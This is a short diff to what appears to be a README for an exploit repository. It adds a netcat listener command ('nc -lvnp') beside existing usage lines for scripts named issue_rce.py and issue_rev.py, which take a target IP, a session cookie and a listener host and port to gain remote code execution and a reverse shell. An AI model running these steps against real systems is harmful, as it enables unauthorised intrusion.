@@ -10,3 +10,7 @@ python3 issue_rce.py <target_ip> <jessionid_cookie>
 ```bash
 python3 issue_rev.py <target_ip> <jsessionid_cookie> <lhost> <lport>
 ```
+#### Usage: Listener
+```bash
+nc -lvnp <lport>
+```
